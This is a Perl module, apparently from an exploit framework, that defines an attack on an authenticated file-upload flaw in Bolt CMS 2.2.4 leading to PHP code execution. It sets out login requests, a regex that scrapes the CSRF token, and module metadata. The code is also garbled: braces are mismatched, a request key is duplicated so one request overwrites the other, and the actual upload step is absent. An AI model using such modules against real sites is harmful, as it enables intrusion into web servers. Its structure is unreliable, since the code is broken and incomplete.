package BOLT::MSF::BoltFileUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "BoltFileUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "ASYNC" => "renamefile",
  "BOLT" => "files",
  "DESCRIPTION" => "

          Bolt CMS contains a flaw that allows an authenticated remote

          attacker to execute arbitrary PHP code. This module was

          tested on version 2.2.4.

        ",
  "MSF_MODULE" => "bolt_file_upload",
  "PATHS" => [""],
  "REFERENCES" => [
    "http://blog.curesec.com/article/blog/Bolt-224-Code-Execution-44.html",
  ],
  "THE THEME PATH TO THE WEB APPLICATION (DEFAULT: BASE-2014)" => "base-2014",
  "TITLE" => "CMS Bolt File Upload Vulnerability",
  "TITLESPACE" => "theme",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "The base path to the web application", VALUE => "/" },
  },
      },  VALIDATION => {
    'TSTRING' =>       " name=\"form\\[_token\\]\" value=\"\\(.+\\)\" ",

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'bolt/login',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__&action=login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /bolt/login',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
